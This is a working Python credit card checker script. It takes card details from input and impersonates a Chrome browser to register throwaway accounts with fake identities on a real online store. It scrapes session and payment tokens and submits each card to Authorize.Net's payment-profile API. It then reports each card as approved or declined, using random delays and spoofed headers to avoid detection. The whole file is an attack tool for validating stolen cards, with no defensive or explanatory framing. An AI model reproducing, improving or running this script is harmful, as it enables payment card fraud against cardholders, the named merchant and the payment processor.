from curl_cffi import requests
import asyncio
from curl_cffi.requests import AsyncSession
import re
from faker import Faker
import random
import string
import json
import time

fake = Faker('en_US')

async def setso():
    while True:
        card_input = input("CC|MM|YY|CVV: ")
        
        separators = ['|', '/']
        for sep in separators:
            if sep in card_input:
                card_parts = card_input.split(sep)
                break
        else:
            card_parts = card_input.split()

        card_num = card_parts[0].strip()
        month = card_parts[1].strip()
        year = card_parts[2].strip()
        cvv = card_parts[3].strip()

        is_amex = card_num.startswith('3') and len(card_num) == 15 and len(cvv) == 4
        is_other = len(card_num) == 16 and len(cvv) == 3
        
        if not (is_amex or is_other):
            continue
        
        if len(month) == 1:
            month = f"0{month}"
        if len(year) == 4 and year.startswith("20"):
            year = year[-2:]
        expiry = f"{month}/{year}"

        await asyncio.sleep(random.uniform(8, 12))

        async with AsyncSession(impersonate="chrome131") as session:
            try:
                main_page = "https://www.startimesupply.com/"
                first_grab = await session.get(main_page)
                if first_grab.status_code == 200:
                    page_content = first_grab.text
                    tok1 = re.search(r'<a href="https://www\.startimesupply\.com/merchant2/merchant\.mvc\?Session_ID=([a-f0-9]{32})&Screen=CTGY&Store_Code=1&Category_Code=01-Bands-Band-Parts">Bands</a>', page_content)
                    if tok1:
                        tok1 = tok1.group(1)
                        base_link = "https://www.startimesupply.com/merchant2/merchant.mvc?Session_ID="
                        push_link = f"{base_link}{tok1}&"
                    else:
                        continue

                    jar = {'mm5-1-basket-id': tok1}

                    fname = fake.first_name().lower()
                    nums = ''.join(random.choices(string.digits, k=6))
                    mail_end = random.choice(['@gmail.com', '@outlook.com'])
                    email = f"{fname}{nums}{mail_end}"
                    user = f"{fake.user_name()}{random.randint(1000, 9999)}"
                    pwd_len = random.randint(10, 12)
                    pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=pwd_len))
                    ship_fname = fake.first_name()
                    ship_lname = fake.last_name()
                    phone = f"205{random.randint(1000, 9999999)}"
                    addr = fake.street_address()
                    city = fake.city()
                    state = fake.state_abbr()
                    zippy = fake.zipcode_in_state(state)

                    signup_data = {
                        'Store_Code': '1',
                        'Action': 'ICST,NEWCST',
                        'Order': '',
                        'Screen': 'CUST_VER_new',
                        'Customer_Login': user,
                        'Customer_LoginEmail': email,
                        'Customer_Password': pwd,
                        'Customer_VerifyPassword': pwd,
                        'Customer_ShipFirstName': ship_fname,
                        'Customer_ShipLastName': ship_lname,
                        'Customer_ShipEmail': email,
                        'Customer_ShipPhone': phone,
                        'Customer_ShipCompany': '',
                        'Customer_ShipAddress1': addr,
                        'Customer_ShipAddress2': '',
                        'Customer_ShipCity': city,
                        'Customer_ShipStateSelect': state,
                        'Customer_ShipState': '',
                        'Customer_ShipZip': zippy,
                        'Customer_ShipCountry': 'US',
                        'Customer_BillFirstName': ship_fname,
                        'Customer_BillLastName': ship_lname,
                        'Customer_BillEmail': email,
                        'Customer_BillPhone': phone,
                        'Customer_BillCompany': '',
                        'Customer_BillAddress1': addr,
                        'Customer_BillAddress2': '',
                        'Customer_BillCity': city,
                        'Customer_BillStateSelect': state,
                        'Customer_BillState': '',
                        'Customer_BillZip': zippy,
                        'Customer_BillCountry': 'US',
                        'Industry2': '',
                        'refer2': '',
                        'purchase': '',
                        'Submit': 'Submit Request',
                    }

                    head1 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'es-ES,es;q=0.9',
                        'cache-control': 'max-age=0',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://www.startimesupply.com',
                        'priority': 'u=0, i',
                        'referer': push_link,
                        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                    }

                    signup_push = push_link
                    signup_resp = await session.post(signup_push, data=signup_data, headers=head1, cookies=jar)

                    if signup_resp.status_code == 200:
                        signup_content = signup_resp.text
                        tok2 = re.search(r'<a href="https://www\.startimesupply\.com/merchant2/merchant\.mvc\?Session_ID=([a-f0-9]{32})&Screen=ACNT&Order=0&Store_Code=1">Edit Account</a>', signup_content)
                        if tok2:
                            tok2 = tok2.group(1)
                        else:
                            continue

                        fetch_params = {
                            'Session_ID': tok2,
                            'Screen': 'UPCC',
                            'Store_Code': '1',
                        }

                        ref_link = f"https://www.startimesupply.com/merchant2/merchant.mvc?Session_ID={tok2}&Screen=LOGN&Customer_Login={email}"
                        head2 = {
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'es-ES,es;q=0.9',
                            'priority': 'u=0, i',
                            'referer': ref_link,
                            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-user': '?1',
                            'upgrade-insecure-requests': '1',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                        }

                        fetch_page = "https://www.startimesupply.com/merchant2/merchant.mvc"
                        fetch_resp = await session.get(fetch_page, params=fetch_params, headers=head2)

                        fetch_content = fetch_resp.text
                        pay_id = re.search(r'<input type="hidden" name="PaymentProfileId" value="(\d+)" />', fetch_content)
                        if pay_id:
                            pay_id = pay_id.group(1)
                        else:
                            continue

                        tok_data = f'customerProfileId={pay_id}&iFrameUrl=https://www.startimesupply.com/merchant2/contentx/IframeCommunicator.html'
                        tok_ref = f"https://www.startimesupply.com/merchant2/merchant.mvc?Session_ID={tok2}&Screen=UPCC&Store_Code=1"
                        head3 = {
                            'accept': '*/*',
                            'accept-language': 'es-ES,es;q=0.9',
                            'content-type': 'application/x-www-form-urlencoded',
                            'origin': 'https://www.startimesupply.com',
                            'priority': 'u=1, i',
                            'referer': tok_ref,
                            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                        }

                        tok_push = "https://www.startimesupply.com/get_token.php"
                        tok_resp = await session.post(tok_push, data=tok_data, headers=head3)
                        site_tok = tok_resp.text

                        card_data = {
                            'paymentMethod': 'cc',
                            'cardCode': cvv,
                            'expirationDate': expiry,
                            'city': city,
                            'address': addr,
                            'country': 'US',
                            'firstName': ship_fname,
                            'lastName': ship_lname,
                            'state': state,
                            'zip': zippy,
                            'phoneNumber': phone,
                            'company': '',
                            'apiFn': 'createPaymentProfile',
                            'cardNumber': card_num,
                            'token': site_tok,
                        }

                        head4 = {
                            'Accept': 'application/json',
                            'Accept-Language': 'es-ES,es;q=0.9',
                            'Connection': 'keep-alive',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Origin': 'https://secure.authorize.net',
                            'Referer': 'https://secure.authorize.net/customer/addPayment',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-Storage-Access': 'active',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                        }

                        card_push = "https://secure.authorize.net/Customer/Api.ashx"
                        card_resp = await session.post(card_push, data=card_data, headers=head4)
                        
                        final_result = json.loads(card_resp.text)
                        result_code = final_result.get("resultCode", "")
                        
                        if result_code == "Error":
                            error_code = final_result.get("messageCode", "Unknown")
                            error_msg = final_result.get("messageText", "Unknown error")
                            output = f"{card_input} => DECLINED |{error_code}| RESPONSE: {error_msg}"
                        else:
                            output = f"{card_input} => APPROVED"
                        
                        print(output)

            except Exception as e:
                continue

if __name__ == "__main__":
    asyncio.run(setso())